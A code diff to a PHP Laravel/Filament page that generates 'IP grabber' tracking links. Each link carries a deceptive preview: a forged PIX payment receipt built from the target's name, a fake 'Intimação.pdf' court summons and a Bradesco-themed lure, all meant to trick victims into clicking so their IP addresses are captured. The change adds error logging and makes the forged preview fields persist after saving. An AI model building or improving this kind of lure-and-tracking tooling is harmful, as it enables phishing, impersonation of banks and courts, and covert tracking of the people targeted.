@@ -9,6 +9,7 @@ use App\Services\Pixel\NewsPreviewMetadataService;
 use App\Services\Pixel\PixImagemService;
 use Filament\Notifications\Notification;
 use Filament\Resources\Pages\CreateRecord;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 
@@ -17,6 +18,9 @@ class CreateIpGrabber extends CreateRecord
     protected static string $resource = IpGrabberResource::class;
 
     protected static ?string $title = 'Gerar IP Grabber';
+
+    /** @var array<string, mixed>|null Campos OG gerados automaticamente, reaplicados em afterCreate() */
+    private ?array $ogGerado = null;
 
     protected function getCreateFormAction(): \Filament\Actions\Action
     {
@@ -68,26 +72,45 @@ class CreateIpGrabber extends CreateRecord
         }
 
         if (($data['preview_tipo'] ?? null) === 'pix_nome_alvo' && $nomeAlvo !== '') {
-            $pathGerado = app(PixImagemService::class)->gerar($nomeAlvo, $data['token']);
+            try {
+                $pathGerado = app(PixImagemService::class)->gerar($nomeAlvo, $data['token']);
+            } catch (\Throwable $e) {
+                Log::warning('PixImagemService::gerar falhou: ' . $e->getMessage());
+                $pathGerado = null;
+            }
+
             if ($pathGerado) {
-                $data['og_titulo'] = 'Comprovante PIX';
-                $data['og_descricao'] = 'Abra o comprovante para confirmar sua chave pix';
-                $data['og_imagem_upload'] = $pathGerado;
-                $data['og_imagem'] = null;
+                $this->ogGerado = [
+                    'og_titulo'        => 'Comprovante PIX',
+                    'og_descricao'     => 'Abra o comprovante para confirmar sua chave pix',
+                    'og_imagem_upload' => $pathGerado,
+                    'og_imagem'        => null,
+                ];
+                $data = array_merge($data, $this->ogGerado);
             }
         }
 
         if (($data['preview_tipo'] ?? null) === 'intimacao') {
-            $data['og_titulo']    = 'Intimação.pdf';
-            $data['og_descricao'] = 'Clique para visualizar e baixar o documento oficial.';
+            $this->ogGerado = [
+                'og_titulo'    => 'Intimação.pdf',
+                'og_descricao' => 'Clique para visualizar e baixar o documento oficial.',
+            ];
 
             if (filled($data['intimacao_arquivo'] ?? null)) {
-                $preview = app(IntimacaoPreviewService::class)->gerarPreview((string) $data['intimacao_arquivo'], $data['token']);
+                try {
+                    $preview = app(IntimacaoPreviewService::class)->gerarPreview((string) $data['intimacao_arquivo'], $data['token']);
+                } catch (\Throwable $e) {
+                    Log::warning('IntimacaoPreviewService::gerarPreview falhou: ' . $e->getMessage());
+                    $preview = null;
+                }
+
                 if ($preview) {
-                    $data['og_imagem_upload'] = $preview;
-                    $data['og_imagem'] = null;
+                    $this->ogGerado['og_imagem_upload'] = $preview;
+                    $this->ogGerado['og_imagem']        = null;
                 }
             }
+
+            $data = array_merge($data, $this->ogGerado);
         }
 
         if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
@@ -117,6 +140,13 @@ class CreateIpGrabber extends CreateRecord
     {
         /** @var IpGrabber $ipGrabber */
         $ipGrabber = $this->record;
+
+        // Reaplica campos OG gerados — o saveRelationships() do Filament pode sobrescrever
+        // og_imagem_upload com null porque o FileUpload na seção oculta não tem arquivo.
+        if ($this->ogGerado) {
+            $ipGrabber->forceFill($this->ogGerado)->save();
+        }
+
         $url = $ipGrabber->trackingUrl();
         $previewUrl = $ipGrabber->trackingUrlWithQuery(['preview' => 1]);
 
